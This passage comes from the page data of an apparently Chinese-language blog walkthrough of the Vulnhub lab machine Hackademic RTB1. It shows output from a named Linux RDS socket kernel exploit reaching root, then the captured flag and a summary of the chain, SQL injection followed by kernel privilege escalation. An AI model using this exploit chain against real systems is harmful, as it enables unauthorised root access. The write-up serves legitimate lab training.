class=\"hljs-number\">0xc044e452</span>\n[*] Overwriting security ops...\n[*] Linux kernel >= <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">30</span> RDS socket exploit\n[*] by Dan Rosenberg\n[*] Resolving kernel addresses...\n [+] Resolved security_ops to <span class=\"hljs-number\">0xc0aa19ac</span>\n [+] Resolved default_security_ops to <span class=\"hljs-number\">0xc0955c6c</span>\n [+] Resolved cap_ptrace_traceme to <span class=\"hljs-number\">0xc055d9d7</span>\n [+] Resolved commit_creds to <span class=\"hljs-number\">0xc044e5f1</span>\n [+] Resolved prepare_kernel_cred to <span class=\"hljs-number\">0xc044e452</span>\n[*] Overwriting security ops...\n[*] Overwriting <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">pointer</span>...\n[*] <span class=\"hljs-title\">Linux</span> <span class=\"hljs-title\">kernel</span> >= 2.6.30 <span class=\"hljs-title\">RDS</span> <span class=\"hljs-title\">socket</span> <span class=\"hljs-title\">exploit</span>\n[*] <span class=\"hljs-title\">by</span> <span class=\"hljs-title\">Dan</span> <span class=\"hljs-title\">Rosenberg</span>\n[*] <span class=\"hljs-title\">Resolving</span> <span class=\"hljs-title\">kernel</span> <span class=\"hljs-title\">addresses</span>...\n [+] <span class=\"hljs-title\">Resolved</span> <span class=\"hljs-title\">security_ops</span> <span class=\"hljs-title\">to</span> 0<span class=\"hljs-title\">xc0aa19ac</span>\n [+] <span class=\"hljs-title\">Resolved</span> <span class=\"hljs-title\">default_security_ops</span> <span class=\"hljs-title\">to</span> 0<span class=\"hljs-title\">xc0955c6c</span>\n [+] <span class=\"hljs-title\">Resolved</span> <span class=\"hljs-title\">cap_ptrace_traceme</span> <span class=\"hljs-title\">to</span> 0<span class=\"hljs-title\">xc055d9d7</span>\n [+] <span class=\"hljs-title\">Resolved</span> <span class=\"hljs-title\">commit_creds</span> <span class=\"hljs-title\">to</span> 0<span class=\"hljs-title\">xc044e5f1</span>\n [+] <span class=\"hljs-title\">Resolved</span> <span class=\"hljs-title\">prepare_kernel_cred</span> <span class=\"hljs-title\">to</span> 0<span class=\"hljs-title\">xc044e452</span>\n[*] <span class=\"hljs-title\">Overwriting</span> <span class=\"hljs-title\">security</span> <span class=\"hljs-title\">ops</span>...\n[*] <span class=\"hljs-title\">Overwriting</span> <span class=\"hljs-title\">function</span> <span class=\"hljs-title\">pointer</span>...\n[*] <span class=\"hljs-title\">Triggering</span> <span class=\"hljs-title\">payload</span>...\n[*] <span class=\"hljs-title\">Restoring</span> <span class=\"hljs-title\">function</span> <span class=\"hljs-title\">pointer</span>...\n</span></code></pre>\n</li>\n<li>\n<p>一长串操作后，我们输入<code>whoami</code>尝试，提权成功！</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">// 靶机shell</span>\nwhoami\nroot\n</code></pre>\n</li>\n<li>\n<p>寻找之前说的<code>key.txt</code> ，<code>flag</code>可能就住在里面</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">// 靶机shell</span>\ncd root <span class=\"hljs-comment\">// 发现root文件夹下存在key.txt</span>\ncat key.txt <span class=\"hljs-comment\">// 读取</span>\n</code></pre>\n<p><code>$_d&#x26;jgQ>>ak\\#b\"(Hx\"o&#x3C;la_%</code> 可能就是<code>flag</code></p>\n<pre><code class=\"hljs language-php\">Yeah!!\nYou must be proud because you <span class=\"hljs-string\">'ve got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)\n\n$_d&#x26;jgQ>>ak\\#b\"(Hx\"o&#x3C;la_%\n\nRegards,\nmr.pr0n || p0wnbox.Team || 2011\nhttp://p0wnbox.com\n\n</span></code></pre>\n</li>\n</ol>\n<h2>思路</h2>\n<p>前端发现id参数，尝试sql注入进入到后台，提权使用内核提权</p>","title":"Vulnhub - Hackademic RTB1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机"},"recentPosts":[{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"},{"id":"HackTheBoxMachine - TwoMillion","title":"HackTheBox - Machine - TwoMillion","date":"2025-06-21","isEncrypted":false,"year":"2025","month":"06","day":"21"},{"id":"群U靶机Tools","title":"群U靶机 - Tools","date":"2025-06-16","isEncrypted":false,"year":"2025","month":"06","day":"16"},{"id":"HackTheBoxMachine - Ellingson","title":"HackTheBox - Machine - Ellingson","date":"2025-06-15","isEncrypted":false,"year":"2025","month":"06","day":"15"}]},"__N_SSG":true}